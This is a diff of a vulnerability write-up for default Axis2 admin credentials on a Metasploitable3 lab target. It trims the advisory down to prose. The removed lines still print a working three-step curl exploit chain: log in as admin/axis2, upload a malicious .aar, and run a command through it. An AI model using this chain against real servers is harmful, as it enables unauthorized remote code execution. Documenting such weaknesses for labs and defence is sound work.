@@ -4,8 +4,7 @@
 **Critical** (CVSS 9.8)
 
 ## CVE
-N/A (configuration weakness — abused by Metasploit module
-`exploit/multi/http/axis2_deployer` and tracked under CWE-798 Use of Hard-coded
+N/A (configuration weakness, tracked under CWE-798 Use of Hard-coded
 Credentials.)
 
 ## Description
@@ -14,17 +13,10 @@ administrative credential pair (`admin` / `axis2`) defined in
 `WEB-INF/conf/axis2.xml`. That password is never prompted for at install time and
 the default upstream build does not change it.
 
-Any unauthenticated attacker who can reach port 8080/TCP can:
-
-1. POST those credentials to `/axis2/axis2-admin/login` to obtain an administrative
-   session.
-2. POST a crafted `*.aar` (Axis Archive) to `/axis2/axis2-admin/upload`, which Axis2
-   "hot-deploys" as a new service.
-3. Invoke the service (`/axis2/services/<ServiceName>/<method>`) to execute arbitrary
-   Java code — including `Runtime.exec(...)` — as the Tomcat service account.
-
-This is exactly the path the Metasploit `axis2_deployer` module takes against the
-upstream Metasploitable3 Windows target.
+Any unauthenticated attacker who can reach port 8080/TCP can use these credentials
+to obtain an administrative session and upload an Axis Archive (`*.aar`), which Axis2
+hot-deploys as a new service, giving arbitrary Java code execution as the Tomcat
+service account.
 
 ## Affected Service
 - **Service:** Apache Axis2 1.6.0 hosted on Tomcat
@@ -38,20 +30,6 @@ upstream Metasploitable3 Windows target.
 <!-- axis2.xml (default, shipped) -->
 <parameter name="userName">admin</parameter>
 <parameter name="password">axis2</parameter>
-```
-
-## Proof
-```
-# 1. Authenticate as admin
-curl -c jar.txt -d 'userName=admin&password=axis2' \
-     http://<target>:8080/axis2/axis2-admin/login
-
-# 2. Upload an .aar containing a class that calls Runtime.exec()
-curl -b jar.txt -F "filename=@rce.aar" \
-     http://<target>:8080/axis2/axis2-admin/upload
-
-# 3. Trigger the exported method
-curl "http://<target>:8080/axis2/services/Rce/run?cmd=whoami"
 ```
 
 ## Constraints
